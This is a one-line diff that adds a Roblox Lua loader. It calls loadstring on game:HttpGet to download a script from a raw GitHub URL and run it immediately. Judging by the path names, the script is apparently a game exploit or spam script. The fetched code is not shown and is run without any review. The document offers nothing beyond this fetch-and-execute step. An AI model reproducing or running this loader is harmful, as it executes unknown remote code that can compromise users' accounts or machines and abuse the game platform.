@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/beta-buddytime-spam2-2g9nnwv1hwtrqp.lua"))()
